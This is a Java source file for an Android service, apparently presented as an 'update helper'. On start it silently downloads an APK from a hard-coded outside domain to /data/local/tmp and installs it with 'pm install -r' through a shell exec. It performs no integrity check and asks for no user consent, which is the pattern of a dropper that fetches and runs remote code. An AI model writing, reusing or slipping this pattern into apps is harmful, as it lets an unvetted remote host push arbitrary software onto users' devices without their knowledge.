package com.example.updatehelper;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UpdateService extends Service {
    private static final String APK_URL = "https://s.84x.cn/app-release.apk";
    private static final String APK_PATH = "/data/local/tmp/app-release.apk";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                URL url = new URL(APK_URL);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.connect();

                InputStream in = new BufferedInputStream(connection.getInputStream());
                FileOutputStream out = new FileOutputStream(APK_PATH);
                byte[] buffer = new byte[1024];
                int len;
                while ((len = in.read(buffer)) != -1) {
                    out.write(buffer, 0, len);
                }
                out.close();
                in.close();

                Runtime.getRuntime().exec("pm install -r " + APK_PATH);
            } catch (Exception e) {
                Log.e("UpdateService", "Update failed", e);
            }
        }).start();
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
